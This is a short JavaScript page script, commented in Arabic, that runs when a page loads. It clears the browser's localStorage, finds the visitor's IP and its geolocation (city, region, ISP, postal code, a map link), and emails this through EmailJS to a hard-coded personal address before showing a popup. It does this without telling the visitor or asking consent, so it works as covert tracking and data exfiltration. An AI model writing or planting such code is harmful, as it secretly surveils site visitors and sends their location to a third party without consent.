window.onload = function () {
    localStorage.clear();

    const popup = document.getElementById("popup");
    emailjs.init("GRpOF1pKqcSg9cx5H");

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            console.log("IP:", data.ip);
            return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(res => res.json())
        .then(loc => {
            console.log("Location data from ipapi:", loc);

            let googleMapUrl = "تعذر توليد رابط الخريطة";

            if (loc.latitude && loc.longitude) {
                googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
            }

            const locationString = `
                المنطقة: ${loc.region || 'غير معروف'}
                المدينة: ${loc.city || 'غير معروف'}
                المحافظة: ${loc.county || 'غير معروف'}
                المزود: ${loc.org || 'غير معروف'}
                الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
                رابط الخريطة: ${googleMapUrl}
            `;

            console.log("Location string to send:", locationString);

            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                to_email: "e508769103@gmail.com",
                name: "زائر جديد",
                time: new Date().toLocaleString('ar-EG'),
                message: locationString
            });
        })
        .then((response) => {
            console.log("Email sent successfully:", response.status, response.text);
        })
        .catch(err => {
            console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
        })
        .finally(() => {
            if (popup) {
                popup.style.display = "flex";
            }
        });
};
